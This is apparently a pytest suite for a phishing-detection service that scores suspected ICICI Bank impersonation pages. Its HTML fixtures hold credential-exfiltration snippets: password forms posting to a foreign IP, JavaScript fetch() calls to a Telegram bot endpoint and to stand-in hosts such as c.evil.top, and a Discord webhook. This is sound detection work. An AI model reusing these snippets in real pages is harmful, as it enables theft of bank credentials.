"""The evidence gate: confirmed needs >= 2 strong signals; never one; never moderate-only."""
from datetime import datetime, timedelta, timezone
from pathlib import Path

from services.config import SETTINGS
from services.enrich.confirm import analyze_page
from services.enrich.fetch import FetchedPage
from services.enrich.fingerprint import dom_structure_hash
from services.ingest.brands import load_brands

KIT = (Path(__file__).parent / "fixtures/kit_a.html").read_text(encoding="utf-8")
ICICI = next(b for b in load_brands(SETTINGS.brands_file).brands if b.name.startswith("ICICI"))
NOW = datetime(2026, 10, 6, tzinfo=timezone.utc)


def page(html, url="https://icici-verify-kyc.top/login", status=200, favicon=None):
    return FetchedPage(url=url, final_url=url, status=status, html=html, headers={}, redirect_chain=[],
                       screenshot=None, favicon=favicon, scripts=[], via="httpx")


def names(r):
    return {s.name for s in r.signals}


def test_two_strong_signals_confirm_with_reasons():
    r = analyze_page(page(KIT), "icici-verify-kyc.top", ICICI, {dom_structure_hash(KIT): "kit-a"}, {}, None,
                     "Let's Encrypt", now=NOW)
    assert r.verdict == "confirmed" and r.strong_count == 2
    post = next(s for s in r.signals if s.name == "credential_post_foreign_origin")
    assert "185.243.115.22" in post.detail and post.strength == "strong"
    assert any(s.name == "kit_dom_hash_match" and "kit-a" in s.detail for s in r.signals)


def test_one_strong_signal_never_confirms():
    r = analyze_page(page(KIT), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
    assert r.verdict == "candidate" and r.strong_count == 1


def test_moderate_and_weak_only_never_confirm():
    html = ("<html><head><title>ICICI Bank login</title></head><body><form action='/x'>"
            "<input type=password></form><script>eval(atob('YQ=='))</script></body></html>")
    r = analyze_page(page(html), "icici-verify-kyc.top", ICICI, {}, {}, NOW - timedelta(days=2),
                     "Let's Encrypt", now=NOW)
    assert r.verdict == "candidate" and r.strong_count == 0
    assert {"title_impersonates_brand", "obfuscated_js", "password_field_present", "recently_registered",
            "issuer_is_free_ca"} <= names(r)


def test_favicon_brand_match_is_strong():
    r = analyze_page(page(KIT, favicon=b"ico"), "icici-verify-kyc.top", ICICI, {},
                     {"ICICI Bank": {__import__("services.enrich.fingerprint", fromlist=["x"]).favicon_hash(b"ico")}},
                     None, None, now=NOW)
    assert r.verdict == "confirmed" and {"favicon_brand_match", "credential_post_foreign_origin"} <= names(r)


def test_post_to_brand_legit_domain_is_not_foreign():
    html = KIT.replace("https://185.243.115.22/gate.php", "https://infinity.icicibank.com/auth")
    r = analyze_page(page(html), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
    assert "credential_post_foreign_origin" not in names(r)


def test_post_to_same_site_is_not_foreign():
    html = KIT.replace("https://185.243.115.22/gate.php", "/gate.php")
    r = analyze_page(page(html), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
    assert "credential_post_foreign_origin" not in names(r)


def test_redirect_final_url_is_the_page_origin():
    html = KIT.replace("https://185.243.115.22/gate.php", "https://landing.attacker.top/p")
    p = FetchedPage(url="https://icici-verify-kyc.top/", final_url="https://landing.attacker.top/login", status=200,
                    html=html, headers={}, redirect_chain=["https://icici-verify-kyc.top/"], screenshot=None,
                    favicon=None, scripts=[], via="httpx")
    r = analyze_page(p, "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
    assert "credential_post_foreign_origin" not in names(r)


def test_parked_page_unreachable():
    r = analyze_page(page("<html><title>This domain is for sale</title></html>"), "x.top", None, {}, {}, None, None,
                     now=NOW)
    assert r.verdict == "unreachable"


def test_tiny_error_page_unreachable():
    r = analyze_page(page("<h1>404</h1>", status=404), "x.top", None, {}, {}, None, None, now=NOW)
    assert r.verdict == "unreachable"


def test_blog_dismissed():
    r = analyze_page(page("<html><title>My blog</title><p>hello</p></html>"), "blog.top", None, {}, {}, None, None,
                     now=NOW)
    assert r.verdict == "dismissed" and r.signals == []


def test_confidence_never_reported_without_signals_and_bounded():
    r = analyze_page(page(KIT), "icici-verify-kyc.top", ICICI, {dom_structure_hash(KIT): "kit-a"}, {}, None,
                     "Let's Encrypt", now=NOW)
    assert 0 < r.confidence < 1


async def test_confirm_orchestration_confirmed_path(monkeypatch):
    import asyncio

    from services.enrich import confirm as c
    from services.enrich.enrichers import Enrichment

    async def fake_fetch(domain, **kw):
        await asyncio.sleep(0.2)
        return page(KIT)

    async def fake_enrich(domain, page):
        await asyncio.sleep(0.2)  # runs concurrently with the fetch
        return Enrichment(ip_addresses=["203.0.113.9"], registered_at=NOW - timedelta(days=3))

    monkeypatch.setattr(c, "fetch", fake_fetch)
    monkeypatch.setattr(c, "enrich", fake_enrich)
    import time
    t = time.perf_counter()
    res, pg, e = await c.confirm("icici-verify-kyc.top", ICICI, known_kits={dom_structure_hash(KIT): "kit-a"},
                                 brand_favicons={}, issuer="Let's Encrypt", now=NOW)
    assert time.perf_counter() - t < 0.39
    assert res.verdict == "confirmed" and pg is not None and e.dom_hash == dom_structure_hash(KIT)
    assert any(s.name == "recently_registered" for s in res.signals)


async def test_confirm_unreachable_never_guesses(monkeypatch):
    from services.enrich import confirm as c
    from services.enrich.enrichers import Enrichment
    from services.enrich.fetch import Unreachable

    async def dead(domain, **kw):
        return Unreachable("ConnectTimeout")

    async def fake_enrich(domain, page):
        return Enrichment()

    monkeypatch.setattr(c, "fetch", dead)
    monkeypatch.setattr(c, "enrich", fake_enrich)
    res, pg, _ = await c.confirm("x.top", None, known_kits={}, brand_favicons={}, issuer=None)
    assert res.verdict == "unreachable" and pg is None and "ConnectTimeout" in res.signals[0].detail


async def test_confirm_rate_limited_stays_candidate(monkeypatch):
    from services.enrich import confirm as c
    from services.enrich.enrichers import Enrichment
    from services.enrich.fetch import RateLimited

    async def limited(domain, **kw):
        return RateLimited("x.top")

    async def fake_enrich(domain, page):
        return Enrichment()

    monkeypatch.setattr(c, "fetch", limited)
    monkeypatch.setattr(c, "enrich", fake_enrich)
    res, _, _ = await c.confirm("x.top", None, known_kits={}, brand_favicons={}, issuer=None)
    assert res.verdict == "candidate" and res.signals[0].name == "rate_limited"


def test_trivial_page_never_matches_a_known_kit():
    bare = "<html><body><form method=post><input type=password></form></body></html>"
    r = analyze_page(page(bare), "icici-verify-kyc.top", ICICI, {dom_structure_hash(bare): "bare"}, {}, None, None, now=NOW)
    assert "kit_dom_hash_match" not in {s.name for s in r.signals}


def test_host_phishing_interstitial_is_not_assessable_never_dismissed():
    """B1: Cloudflare's 'Suspected Phishing' warning hides the page. We cannot judge content we cannot see, so this
    is not a dismissal (and not a confirmation either: the host's opinion is not our evidence)."""
    html = ("<html><head><title>Suspected Phishing | Cloudflare</title></head><body>Warning: Suspected Phishing"
            " Site Ahead!</body></html>")
    r = analyze_page(page(html, status=403), "amazongiveaway1538.pages.dev", None, {}, {}, None, None, now=NOW)
    assert r.verdict == "unreachable" and "interstitial" in r.signals[0].detail
    r = analyze_page(page(html, status=200), "x.pages.dev", None, {}, {}, None, None, now=NOW)
    assert r.verdict == "unreachable"


# ---- S1/S2 behind the S3 gate: off by default; a strength only once the gate has run ----------------------------
TG = "https://api.telegram.org/bot7012345678:AAH" + "x" * 32 + "/sendMessage"
SPA = ("<html><head><title>ICICI Bank login</title></head><body><div id=app><input type=password name=p></div>"
       f"<script>fetch('{TG}',{{method:'POST'}});fetch('https://c.evil.top/save',{{method:'POST'}})</script></body></html>")


def test_shipped_defaults_s1_strong_s2_moderate():
    """Owner decisions 2026-10-07/08 from the S3 gate: S1 strong (0 FP), S2 moderate (1 held-out FP). With S2 moderate
    a JS-era kit has at most one live-capable strong signal, so it stays a candidate: never confirmed on one fact."""
    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW)
    strengths = {s.name: s.strength for s in r.signals}
    assert strengths["credential_exfil_endpoint"] == "strong"
    assert strengths["credential_post_foreign_origin_js"] == "moderate"
    assert r.strong_count == 1 and r.verdict == "candidate"


def test_exfil_signals_at_strong_can_confirm_and_carry_their_evidence():
    """Telegram exfil (S1) + a POST to a DIFFERENT site (S2): two artifacts, two detectors, two strong."""
    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                     signal_strengths={"exfil": "strong", "js_post": "strong"})
    assert r.verdict == "confirmed" and r.strong_count == 2
    ex = next(s for s in r.signals if s.name == "credential_exfil_endpoint")
    assert "telegram_bot" in ex.detail and "rendered DOM" in ex.detail and ex.artifacts == ("endpoint:telegram.org",)
    js = [s for s in r.signals if s.name == "credential_post_foreign_origin_js"]
    assert {a for s in js for a in s.artifacts} == {"endpoint:telegram.org", "endpoint:evil.top"}
    assert any("https://c.evil.top" in s.detail for s in js)
    assert {"name", "strength", "detail", "artifacts"} <= set(r.reasons()["signals"][0])


def test_exfil_signals_at_moderate_never_confirm_alone():
    r = analyze_page(page(SPA), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                     signal_strengths={"exfil": "moderate", "js_post": "moderate"})
    assert r.verdict == "candidate" and r.strong_count == 0


def test_one_exfil_endpoint_is_one_strong_signal_not_two():
    """S1 and S2 must not double-count the same evidence: a Telegram POST alone is ONE strong signal."""
    only_tg = SPA.replace("fetch('https://c.evil.top/save',{method:'POST'})", "")
    r = analyze_page(page(only_tg), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                     signal_strengths={"exfil": "strong", "js_post": "strong"})
    assert r.strong_count == 1 and r.verdict == "candidate"



# ---- S3b: the shared independence rule -----------------------------------------------------------------------------
from services.enrich.confirm import Signal, independent_strong  # noqa: E402


def sig(name, *arts, strength="strong"):
    return Signal(name, strength, "x", tuple(arts))


def test_independent_strong_counts_distinct_detectors_on_distinct_artifacts():
    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "dom:1")]) == 2
    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "endpoint:x.top")]) == 1   # same artifact
    assert independent_strong([sig("a", "endpoint:x.top"), sig("a", "endpoint:y.top")]) == 1   # same detector
    assert independent_strong([sig("a", "endpoint:x.top"), sig("b", "dom:1", strength="moderate")]) == 1
    assert independent_strong([]) == 0


def test_independent_strong_picks_the_non_colliding_instance():
    """S1 on telegram.org; S2 on telegram.org AND evil.top: S2's evil.top instance is independent -> 2."""
    assert independent_strong([sig("s1", "endpoint:telegram.org"), sig("s2", "endpoint:telegram.org"),
                               sig("s2", "endpoint:evil.top")]) == 2


def test_rule_is_shared_by_the_static_form_check_too():
    """Not a special case of S1/S2: a static form POSTing to X and the page's code POSTing to X is one observation."""
    html = ("<html><head><title>ICICI Bank login</title></head><body><form method=post action='https://c.evil.top/p'>"
            "<input type=password name=p></form><script>fetch('https://c.evil.top/p',{method:'POST'})</script></body></html>")
    r = analyze_page(page(html), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                     signal_strengths={"exfil": "strong", "js_post": "strong"})
    assert {"credential_post_foreign_origin", "credential_post_foreign_origin_js"} <= names(r)
    assert r.strong_count == 1 and r.verdict == "candidate"


def test_two_exfil_endpoints_from_one_detector_are_one_strong_signal():
    two = SPA.replace("fetch('https://c.evil.top/save',{method:'POST'})",
                      "x='https://discord.com/api/webhooks/123456789012345678/abcDEFghiJKL'")
    r = analyze_page(page(two), "icici-verify-kyc.top", ICICI, {}, {}, None, None, now=NOW,
                     signal_strengths={"exfil": "strong", "js_post": "off"})
    assert sum(s.name == "credential_exfil_endpoint" for s in r.signals) == 2 and r.strong_count == 1
